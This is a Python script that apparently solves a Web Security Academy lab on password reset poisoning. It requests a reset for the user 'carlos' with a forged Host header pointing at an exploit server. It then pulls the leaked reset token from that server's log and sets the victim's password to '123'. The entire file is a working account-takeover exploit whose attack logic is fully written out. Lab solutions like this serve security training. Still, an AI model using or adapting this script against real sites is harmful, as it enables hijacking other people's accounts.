import requests
from bs4 import BeautifulSoup
import re

url = "https://ac3e1f5b1eec4ae3c0b901f900da00f4.web-security-academy.net"

url_ex = "https://exploit-acd41f321ef04a3bc01c0105019f0058.web-security-academy.net"

def get_csrf(txt):
	soup = BeautifulSoup(txt, 'html.parser')
	token = soup.find_all('input', {'name': 'csrf'})[0].get('value')
	return token

def slove(url, url_ex):
	
	s = requests.session()

	r1 = s.get(url)
	r2 = s.get(url + "/login")

	# print(get_csrf(r2.text))

	data = {'csrf': get_csrf(r2.text), 'username': 'carlos'}
	header = {"Host": url_ex+"/exploit"}
	r3 = s.post(url+"/forgot-password", data=data, headers=header) 


	r4 = s.get(url_ex + "/log")
	t = re.findall("=\w*", r4.text)[-1].replace('=', '')

	r5 = s.get(url + "/forgot-password?temp-forgot-password-token="+ t)
	data2 = {'csrf': get_csrf(r5.text), 'temp-forgot-password-token': t, 'new-password-1': '123', 'new-password-2': '123'}
	r6 = s.post(url + '/forgot-password?temp-forgot-password-token=' + t, data = data2)
	print(r6.text)





slove(url, url_ex)
# /forgot-password?temp-forgot-password-token=